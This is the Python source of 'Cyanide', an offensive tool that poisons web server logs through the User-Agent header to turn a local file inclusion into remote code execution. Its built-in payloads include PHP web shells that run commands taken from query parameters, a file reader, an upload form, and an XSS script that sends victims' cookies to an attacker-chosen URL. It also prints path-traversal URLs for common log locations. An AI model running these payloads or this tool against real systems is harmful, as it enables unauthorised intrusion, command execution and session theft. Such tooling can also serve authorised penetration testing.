#!/usr/bin/python
import requests
import argparse
from colorama import init, Fore, Style
init(convert=True)

VERSION = "V1.2.0"

class Payload():
    def __init__(self, id, name, code, argcount, desc, usage):
        self.id = id
        self.name = name
        self.code = code
        self.desc = desc
        self.usage = usage
        self.argcount = argcount

    def build(self, args):
        if len(args) == self.argcount:
            self.code = self.code % tuple(args)
        else:
            throwProgramError("PAYLOAD BUILDING ERROR",
                              f"Payload {self.id} necessitates {self.argcount} arguments!")

    def __str__(self):
        return f"{CODES['HELP']} {self.id} (min. {len(self.code)} chars, necessitates {self.argcount} args) -> {self.name}: {self.desc} Usage: {self.usage}"


CODES = {
    "INFO": Fore.MAGENTA + "[i]" + Style.RESET_ALL,
    "HELP": Fore.GREEN + "[?]" + Style.RESET_ALL,
    "ERR": Fore.RED + "[!]" + Style.RESET_ALL,
    "SUC": Fore.CYAN + "[*]" + Style.RESET_ALL,
    "PROB": Fore.YELLOW + "[*?]" + Style.RESET_ALL
}

PAYLOADS = [
    Payload("PHPCMD", "PHP Simple Command Injection",
            "<?php echo(isset($_GET['c']))?system($_GET['c']):'Usage: ?c=COMMAND'; ?>", 0, "[PHP] Simple command injection with query variable 'c'.", "Ex.: ?c=ls"),
    Payload("PHPB64CMD", "PHP Simple Base64 Command Injection", "<?php echo(isset($_GET['b']))?system(urldecode(base64_decode($_GET['b']))):'Usage: ?b=B64_COMMAND'; ?>",
            0, "[PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded.", "Ex.: ?b=bHM%3D"),
    Payload("PHPREADFILE", "PHP File Reader", "<?php echo(isset($_GET['f']))?('<code><pre>'.htmlentities(file_get_contents($_GET['f'])).'</pre></code>'):'Usage: ?f=FILENAME'; ?>",
            0, "[PHP] Read a file's contents. Using parameter 'f' to specificy a filename.", "Ex.: ?f=filename.ext"),

    Payload("PHPUPLOAD", "PHP Simple File Upload", "<form action=''enctype='multipart/form-data'method='POST'><input type='file'name='u'><input type='submit'value='Upload'></form><?php if(!empty($_FILES['u'])){if(move_uploaded_file($_FILES['u']['tmp_name'],basename($_FILES['u']['name']))){echo '<b>Upload successful.</b>';}else{echo '<b>There was a problem, try again!</b>';}} ?>", 0, "[PHP] Simple file upload page to pop in the logs.", "You should find a typical file upload section in the logs."),
    Payload("JSCOOKIEXSS", "JavaScript Simple XSS Cookie Stealer", "<script type='text/javascript'>document.location='%s'+encodeURIComponent(btoa(document.cookie))</script>", 1, "[JS] Simple XSS Cookie Stealer. Needs one argument being the link to send a request with the cookies to.", "Specify the URL after choosing the payload. Ex.: -pl JSCOOKIEXSS http://myurl.com/")
]


def getPayloadById(payloadid):
    for p in PAYLOADS:
        if p.id == payloadid:
            return p

    throwProgramError("UNKNOWN PAYLOAD ID", payloadid + "!")


def throwProgramError(type, excerpt, doExit=True):
    print(f"{CODES['ERR']} {type}: {excerpt}")
    if doExit: exit()


def banner():
    print(f"""===========================================================================
 ________      ___    ___________  ________   ___  ________ __________
/\\   ____\\    /\\  \\  /  /\\   __  \\/\\   ___  \\/\\  \\/\\   ___ \\\\    _____\\
\\ \\  \\___|    \\ \\  \\/  /\\ \\  \\_\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\_|\\ \\\\    ___\\
 \\ \\  \\____    \\ \\    /  \\ \\   __  \\ \\  \\\\ \\  \\ \\  \\ \\  \\_\\\\ \\\\   \\_____ 
  \\ \\_______\\ __\\/   /    \\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\__\\ \\_______\\\\________\\
   \\|_______|/\\_____/      \\/__/\\/__/\\/__/ \\/__/\\/__/\\/_______//________/
=============\\/____/=======================================================
{CODES["INFO"]} Cyanide: Log Poisoner (LFI to RCE)
{CODES["INFO"]} Version: {VERSION}
{CODES["INFO"]} Author: Noxtal
{CODES["INFO"]} Website: https://noxtal.com
{CODES["INFO"]} BadByte Official Program (https://discord.gg/CDACNFg)
    """)


def print_payloads():
    print(f"{CODES['HELP']} AVAILABLE PAYLOADS")
    for p in PAYLOADS:
        print(p)


def poison(url, payload, method="GET", parameter="page", encode_lvl=0, prefix="", suffix=""):
    headers = {"User-Agent": payload}
    try:
        if not url.startswith("http://"):
            url = f"http://{url}"
        if not url.endswith("/"):
            url = f"{url}/"

        dot = "."
        slash = "/"
        if encode_lvl == 1:
            dot = "%2e"
            slash = "%2f"
        elif encode_lvl == 2:
            dot = "%252e"
            slash = "%252f"

        r = requests.request(method, url, headers=headers)
        r.raise_for_status()

        print(f"""
{CODES["SUC"]} LOGS SUCCESSFULLY POISONED. (IF TARGET IS VULNERABLE)
Access your payload using one of the following URLs:
[Apache]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache{slash}access{dot}log{suffix}
[Apache2]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache2{slash}access{dot}log{suffix}
[Nginx]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}nginx{slash}access{dot}log{suffix}
[httpd]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}httpd{slash}access{suffix}
[Nostromo]
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}nostromo{slash}logs{slash}access_log{suffix}
              """)
    except requests.exceptions.HTTPError as e:
        throwProgramError("HTTP ERROR", e, doExit=False)
        print(f"""
{CODES["PROB"]} ERROR LOGS PROBABLY POISONED.
Try to access your payload using one of the following URLs:
[Apache]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache{slash}access{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache{slash}error{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}usr{slash}local{slash}apache{slash}log{slash}error_log{suffix}
[Apache2]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache2{slash}access{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}apache2{slash}error{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}usr{slash}local{slash}apache2{slash}log{slash}error_log{suffix}
[Nginx]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}nginx{slash}access{dot}log{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}nginx{slash}error{dot}log{suffix}
[httpd]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}httpd{slash}access{suffix}
- {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}log{slash}httpd{slash}error_log{suffix}
[Nostromo]
- [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}nostromo{slash}logs{slash}access_log{suffix}
              """)
    except requests.exceptions.ConnectionError as e:
        throwProgramError("CONNECTION ERROR", e)
    except requests.exceptions.Timeout as e:
        throwProgramError("TIMEOUT ERROR", e)
    except requests.exceptions.RequestException as e:
        throwProgramError("UNEXPECTED ERROR", e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts {len(PAYLOADS)} different payloads for now.")
    parser.add_argument("-q", "--quiet", "--no-banner", action="store_true",
                        help="Quiet mode. No banner.")
    parser.add_argument("-Pl", "--payloads", "--list", action="store_true",
                        help="List all possible payloads.")
    parser.add_argument("-pl", "--payload", "--set-payload", nargs="*",
                        help="Set payload (by index or ID). Use -Pl to list available payloads.")
    parser.add_argument("-m", "--method", type=str,
                        help="HTTP request method. Ex.: POST")
    parser.add_argument("-P", "--par", "--parameter", metavar="PARAMETER", type=str,
                        help="Query parameter name. Ex.: '-P view' => '?view='")
    parser.add_argument("-e", "--encode", "--dds-encode", action="store_true",
                        help="URL encode ../")
    parser.add_argument("-E", "--double-encode", "--dds-double-encode", action="store_true",
                        help="Double-encode ../")
    parser.add_argument("-p", "--prefix", type=str,
                        help="Query prefix. Ex.: '../../../../../etc/cat/'")
    parser.add_argument("-s", "--suffix", type=str,
                        help="Query suffix. Ex.: '&other='")
    parser.add_argument("-u", "--URL", "--url", type=str,
                        help="URL to attack.")

    args = parser.parse_args()

    if not args.quiet:
        banner()
    else:
        print(f"{CODES['INFO']} Cyanide {VERSION} by Noxtal")

    if args.payloads:
        print_payloads()
    else:
        if args.URL != None:
            # Main program functionality
            encode_lvl = 0
            if args.encode:
                encode_lvl = 1
            if args.double_encode:
                encode_lvl = 2

            payload = None
            if args.payload == None:
                payload = getPayloadById("PHPCMD")
            else:
                if str.isnumeric(args.payload[0]):
                    try:
                        payload = PAYLOADS[int(args.payload[0])]
                    except IndexError as e:
                        throwProgramError(
                            "PAYLOAD INDEX OUT OF RANGE ERROR", e)
                else:
                    payload = getPayloadById(args.payload[0])
                payload.build(args.payload[1:])

            print(f"{CODES['SUC']} SELECTED PAYLOAD: {payload.name}")

            method = args.method if args.method != None else "GET"
            parameter = args.par if args.par != None else "page"
            prefix = args.prefix if args.prefix != None else ""
            suffix = args.suffix if args.suffix != None else ""

            poison(args.URL, payload.code, method,
                   parameter, encode_lvl, prefix, suffix)
        else:
            throwProgramError(
                "PARSING ERROR", "-u <URL> is required for this action!")
            parser.print_usage()
